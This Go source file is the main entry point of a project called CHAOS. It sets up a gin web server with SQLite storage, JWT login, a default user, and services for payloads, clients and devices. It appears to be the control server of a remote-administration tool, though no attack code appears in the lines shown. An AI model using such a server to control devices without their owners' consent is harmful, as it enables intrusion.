package main

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/jinzhu/gorm"
	"github.com/sirupsen/logrus"
	httpDelivery "github.com/tiagorlampert/CHAOS/delivery/http"
	"github.com/tiagorlampert/CHAOS/infrastructure/database"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/middleware"
	"github.com/tiagorlampert/CHAOS/internal/utilities/constants"
	"github.com/tiagorlampert/CHAOS/internal/utilities/system"
	"github.com/tiagorlampert/CHAOS/internal/utilities/template"
	"github.com/tiagorlampert/CHAOS/internal/utilities/ui"
	"github.com/tiagorlampert/CHAOS/repositories/sqlite"
	"github.com/tiagorlampert/CHAOS/services"
	"net/http"
)

const AppName = "CHAOS"

var Version = "dev"

type App struct {
	logger        *logrus.Logger
	configuration *environment.Configuration
	router        *gin.Engine
}

func init() {
	system.ClearScreen()

	if err := Setup(); err != nil {
		logrus.Error(err)
	}
}

func main() {
	logger := logrus.New()
	logger.Info(`Loading environment variables`)

	configuration := environment.Load()
	if err := configuration.Validate(); err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`error validating environment config variables`)
	}

	dbClient, err := database.NewSqliteClient(constants.DatabaseDirectory, configuration.Database.Name)
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error connecting with database`)
	}

	if err := NewApp(logger, configuration, dbClient.Conn).Run(); err != nil {
		logger.WithField(`cause`, err).Fatal(fmt.Sprintf("failed to start %s Application", AppName))
	}
}

func NewApp(logger *logrus.Logger, configuration *environment.Configuration, dbClient *gorm.DB) *App {
	//repositories
	authRepository := sqlite.NewAuthRepository(dbClient)
	userRepository := sqlite.NewUserRepository(dbClient)
	deviceRepository := sqlite.NewDeviceRepository(dbClient)

	//services
	payloadService := services.NewPayload()
	authService := services.NewAuth(logger, configuration.SecretKey, authRepository)
	userService := services.NewUser(userRepository)
	deviceService := services.NewDevice(deviceRepository)
	clientService := services.NewClient(Version, authRepository, payloadService, authService)
	urlService := services.NewUrlService(clientService)

	//router
	router := gin.Default()
	router.Use(gin.Recovery())
	router.Static("/static", "web/static")
	router.HTMLRender = template.LoadTemplates("web")

	auth, err := authService.Setup()
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error preparing authentication`)
	}
	jwtMiddleware, err := middleware.NewJWTMiddleware(auth.SecretKey, userService)
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error creating jwt middleware`)
	}
	if err := userService.CreateDefaultUser(); err != nil {
		logger.WithField(`cause`, err).Fatal(`error creating default user`)
	}

	httpDelivery.NewController(
		configuration,
		router,
		logger,
		jwtMiddleware,
		clientService,
		authService,
		payloadService,
		userService,
		deviceService,
		urlService,
	)

	return &App{
		configuration: configuration,
		logger:        logger,
		router:        router,
	}
}

func Setup() error {
	return system.CreateDirs(
		constants.TempDirectory, constants.DatabaseDirectory)
}

func (a *App) Run() error {
	ui.ShowMenu(a.configuration.Server.Port)

	a.logger.WithFields(
		logrus.Fields{`version`: Version, `port`: a.configuration.Server.Port}).Info(`Starting `, AppName)

	return http.ListenAndServe(
		fmt.Sprintf(":%s", a.configuration.Server.Port),
		http.TimeoutHandler(a.router, constants.TimeoutDuration, constants.TimeoutExceeded))
}
